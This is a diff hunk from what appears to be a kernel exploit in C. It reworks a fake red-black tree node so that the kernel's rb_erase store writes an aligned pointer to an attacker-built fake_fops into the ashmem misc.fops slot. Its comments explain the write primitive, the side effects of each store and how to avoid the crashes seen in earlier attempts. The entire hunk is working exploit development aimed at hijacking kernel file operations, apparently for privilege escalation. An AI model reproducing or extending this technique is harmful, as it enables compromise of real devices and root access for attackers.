@@ -1166,16 +1166,26 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
              * objects on the same page as fake_fops. BSS lock + heap
              * fake_fops as rb parent KPd at pselect (16:02 / 16:07).
              */
-            /* pc = fake_fops | RED: (a) red skips the rb_erase rebalance
-             * path entirely; (b) the erase's store-2 (__rb_change_child)
-             * writes &misc.fops into pc+8 (llseek slot) — the observed
-             * suid-bits store, now landing on a slot the test verifies
-             * around (ashmem open/ioctl never need llseek). */
-            tree_pc = (uint64_t)fake_fops | 1ULL;
-            tree_r = 0;
-            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
-                (active_offsets ? (uint64_t)active_offsets->off_ashmem_misc_fops
-                                : ASHMEM_MISC_FOPS_OFF));
+            /* CLASSIC STORE-2 SWAP (fire-3 lesson): store-1's value IS
+             * tree_pc, so the red color bit leaks into the stored pointer
+             * (misaligned misc.fops = alignment fault at first open).
+             * Swap through STORE-2 instead (__rb_change_child writes the
+             * child into parent+8):
+             *   tree_pc = (slot-8)|1  — red throwaway parent in .data
+             *                           next to the slot (readable, no
+             *                           rebalance)
+             *   tree_r  = fake_fops   — CLEAN aligned pointer = the value
+             *   store-2: *(slot-8+8) = fake_fops  → *misc.fops = clean
+             *   store-1's cost: *(fake_fops+0) = (slot-8)|1 — owner slot
+             *   holds a VALID .data addr (fops_get's atomic inc/dec lands
+             *   in mapped memory; the historical crash was owner=1, a
+             *   near-NULL). */
+            tree_pc = (((uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                          (active_offsets
+                               ? (uint64_t)active_offsets->off_ashmem_misc_fops
+                               : ASHMEM_MISC_FOPS_OFF))) - 8ULL) | 1ULL;
+            tree_r = (uint64_t)fake_fops;
+            tree_l = 0;
             pi_parent = 0;
             pi_right = 0;
             pi_left = 0;
